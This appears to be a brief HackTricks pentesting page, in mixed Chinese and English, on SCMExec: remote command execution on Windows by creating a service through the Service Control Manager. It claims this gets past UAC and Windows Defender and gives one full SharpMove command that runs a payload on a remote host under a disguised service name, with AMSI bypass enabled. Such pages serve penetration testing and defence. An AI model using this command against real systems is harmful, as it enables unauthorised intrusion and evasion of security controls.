# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** 是一种在远程系统上执行命令的 technique，通过 Service Control Manager (SCM) 创建一个运行该命令的服务。此方法可以绕过某些安全控制，例如 User Account Control (UAC) 和 Windows Defender。

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
